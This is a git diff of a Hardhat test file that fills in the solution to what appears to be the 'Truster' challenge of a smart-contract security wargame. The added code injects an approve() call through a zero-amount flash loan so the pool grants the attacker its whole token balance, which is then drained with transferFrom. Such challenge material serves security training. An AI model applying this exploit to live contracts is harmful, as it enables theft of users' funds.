@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { getContractFactory } = require('@nomiclabs/hardhat-ethers/types');
 
 describe('[Challenge] Truster', function () {
     let deployer, attacker;
@@ -28,7 +29,20 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
+        /** CODE YOUR EXPLOIT HERE  */                        
+        const iface = new ethers.utils.Interface([
+            "function approve(address,uint256) external returns (bool)"
+        ])
+        const calldata = iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);                        
+        await this.pool.flashLoan(
+            ethers.BigNumber.from("0"),
+            attacker.address,            
+            this.token.address,            
+            calldata    
+        );
+
+        const allowance = await this.token.allowance(this.pool.address, attacker.address);                
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, allowance);                
     });
 
     after(async function () {
